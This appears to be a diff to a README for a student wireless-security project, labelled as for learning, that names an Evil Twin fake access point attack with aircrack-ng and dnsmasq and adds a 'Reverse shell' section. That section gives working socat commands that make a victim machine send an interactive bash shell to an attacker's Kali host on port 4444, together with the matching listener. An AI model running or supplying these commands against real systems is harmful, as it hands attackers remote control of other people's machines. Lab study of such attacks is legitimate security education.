@@ -2,14 +2,13 @@
 
 仅供参考,此project为学习之用,了解破解流程,学习无线安全
 
-the recording file is in the link below:
+The recording file is in the link below:
 
 https://drive.google.com/open?id=1EdF8AQh95s0FsDAZry5Uj2Y-TkjsgGOC
 
 system : kali linux
 
-software : aiicrack-ng
-
+software : aiicrack-ng dnsmasq
 ## Task2 
 
 Evil Twin AP Attack: Set up a fake AP impersonating the target AP, and force target AP users to connect to it.
@@ -144,5 +143,33 @@ after installation ,type
 /etc/init.d/mysql start
 ```
 
+###  Reverse shell
 
+1. install socat 
 
+Type the command in your terminal
+
+```
+apt-get install socat
+```
+2. in victim machine
+in this case 
+
+VICTIM IP：192.168.1.107
+
+KALI IP：192.168.1.102
+
+Type command
+
+```
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.102:4444
+```
+Just change the victimIP with your target IP
+
+and in the attcker machine which is kali
+
+Type command
+
+```
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
